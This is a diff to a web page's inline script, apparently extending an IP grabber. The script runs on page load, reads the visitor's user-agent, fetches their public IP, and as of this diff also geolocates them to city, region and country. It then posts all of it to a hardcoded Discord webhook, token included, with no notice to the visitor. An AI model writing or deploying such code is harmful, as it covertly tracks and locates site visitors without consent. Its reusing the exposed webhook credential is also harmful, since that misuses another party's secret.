@@ -38,25 +38,42 @@
 
   </script>
 <script>
-function logUserInfo() {
-const userAgent = navigator.userAgent;
-console.log("User-Agent: " + userAgent);
-fetch('https://api64.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-        const ipAddress = data.ip;
-        console.log("IP Address: " + ipAddress);
-        sendToDiscord(userAgent, ipAddress);
-        })
-        .catch(error => {
-        console.error("Error fetching IP address:", error);
-        });
+    function logUserInfo() {
+        const userAgent = navigator.userAgent;
+        console.log("User-Agent: " + userAgent);
+
+        // Fetch IP address
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                console.log("IP Address: " + ipAddress);
+
+                // Fetch location information using ipstack API
+                fetch(`http://api.ipstack.com/${ipAddress}?access_key=YOUR_IPSTACK_ACCESS_KEY`)
+                    .then(response => response.json())
+                    .then(locationData => {
+                        const city = locationData.city;
+                        const region = locationData.region_name;
+                        const country = locationData.country_name;
+                        console.log(`Location: ${city}, ${region}, ${country}`);
+
+                        // Send data to Discord webhook
+                        sendToDiscord(userAgent, ipAddress, city, region, country);
+                    })
+                    .catch(error => {
+                        console.error("Error fetching location information:", error);
+                    });
+            })
+            .catch(error => {
+                console.error("Error fetching IP address:", error);
+            });
     }
 
-    function sendToDiscord(userAgent, ipAddress) {
+    function sendToDiscord(userAgent, ipAddress, city, region, country) {
         const webhookURL = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
         const payload = {
-            content: `User-Agent: ${userAgent}\nIP Address: ${ipAddress}`
+            content: `User-Agent: ${userAgent}\nIP Address: ${ipAddress}\nLocation: ${city}, ${region}, ${country}`
         };
         fetch(webhookURL, {
             method: 'POST',
@@ -74,6 +91,7 @@ fetch('https://api64.ipify.org?format=json')
             console.error('Error sending data to Discord webhook:', error);
         });
     }
+
     window.onload = logUserInfo;
 </script>
   <style>
